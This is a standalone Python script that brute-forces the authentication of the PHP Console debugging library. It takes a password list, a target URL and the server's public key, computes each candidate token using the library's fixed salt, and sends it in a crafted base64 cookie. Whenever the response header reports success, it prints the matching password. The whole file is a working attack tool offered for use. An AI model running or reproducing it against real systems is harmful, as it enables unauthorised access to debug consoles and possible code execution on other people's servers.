import requests, base64, hashlib, re, sys

try:
    PUBLIC_KEY = sys.argv[3]
    PASS_FILE = sys.argv[1]
    URL = sys.argv[2]
except IndexError as e:
    print(f"usage: {sys.argv[0]} <password-file>  <target-url>  <public-key>")
    sys.exit(0)
except Exception as e:
    print(e)
    sys.exit(0)
SUCCESS_RE = re.compile('.*(\"isSuccess":true\}).*')
SUCCESS = False
with open(PASS_FILE, 'r') as passwords:
    for line in passwords.readlines():
        try:
            phash = hashlib.sha256((line.strip() + 'NeverChangeIt:)').encode()).hexdigest()
            token = hashlib.sha256((phash + PUBLIC_KEY).encode()).hexdigest();
            data = '{"php-console-client":5,"auth":{"publicKey":"' + PUBLIC_KEY + '","token":"' + token + '"}}'
            payload = base64.b64encode(data.encode()).decode()
            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
                'Cookie': f'php-console-server=5; php-console-client={payload}'
            }

            response = requests.get(URL, headers=headers)
            if SUCCESS_RE.match(response.headers['PHP-Console']) or SUCCESS_RE.match(response.headers['php-console']):
                print(line.strip()+':', response.headers,"")
        except Exception as e:
            print(e)



